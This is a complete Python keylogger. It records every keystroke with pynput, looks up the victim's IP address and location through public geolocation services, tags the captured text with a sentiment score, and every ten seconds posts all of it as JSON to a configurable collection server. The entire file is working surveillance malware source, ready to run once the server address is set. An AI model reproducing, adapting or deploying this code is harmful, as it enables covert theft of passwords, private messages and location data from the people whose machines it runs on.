from pynput import keyboard
import requests
import json
import threading
import time
from textblob import TextBlob

text = ""

# Your Flask server's IP and port (update these as needed)
ip_address = "localhost"  # Change to your server IP if not running locally
port_number = "8080"
time_interval = 10  # Seconds between sending data

def analyze_sentiment(text):
    if not text.strip():
        return "Neutral"
    
    blob = TextBlob(text)
    polarity = blob.sentiment.polarity
    if polarity > 0:
        return "Positive"
    elif polarity < 0:
        return "Negative"
    else:
        return "Neutral"

def get_geo_info():
    services = [
        "https://ipapi.co/json",
        "https://ipinfo.io/json",
        "http://ip-api.com/json",
        "https://ipwhois.app/json/"
    ]
    
    for url in services:
        try:
            res = requests.get(url, timeout=4)
            # Fix: Check if request was actually successful
            if res.status_code != 200:
                continue
            
            data = res.json()
            
            # Fix: Ensure IP data actually exists before returning
            if not data.get("ip") and not data.get("query"):
                continue
                
            return {
                "ip": data.get("ip") or data.get("query"),
                "city": data.get("city", "Unknown"),
                "region": data.get("region") or data.get("regionName", "Unknown"),
                "country": data.get("country") or data.get("country_name", "Unknown")
            }
        except Exception as e:
            print(f"Error getting geo info from {url}: {e}")
            continue
    
    return {"ip": "Unknown", "city": "Unknown", "region": "Unknown", "country": "Unknown"}

def send_post_req():
    global text
    try:
        # Only send if there's text to send
        if text.strip():
            geo = get_geo_info()
            sentiment = analyze_sentiment(text)
            payload = json.dumps({
                "keyboardData": text,
                "sentiment": sentiment,
                "geo": geo
            })
            
            response = requests.post(
                f"http://{ip_address}:{port_number}/api/keylogger", 
                data=payload, 
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                print(f"Data sent successfully: {text[:30]}...")
                text = ""  # Reset text only if successful
            else:
                print(f"Error sending data: {response.status_code} - {response.text}")
        else:
            print("No text to send")
    except Exception as e:
        print(f"Couldn't complete request! Error: {e}")
    finally:
        # Schedule the next send
        timer = threading.Timer(time_interval, send_post_req)
        timer.daemon = True  # Allow the thread to exit when main program exits
        timer.start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif hasattr(key, 'char') and key.char is not None:
            text += key.char
    except Exception as e:
        print(f"Error processing key: {e}")

def main():
    # Print startup message
    print("Keylogger started. Press Ctrl+C to exit.")
    print(f"Sending data to http://{ip_address}:{port_number}/api/keylogger every {time_interval} seconds")
    
    try:
        # Start sending data in a separate thread
        send_post_req()
        
        # Start the keyboard listener
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
            
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
    except Exception as e:
        print(f"Error in main thread: {e}")

if __name__ == "__main__":
    main()
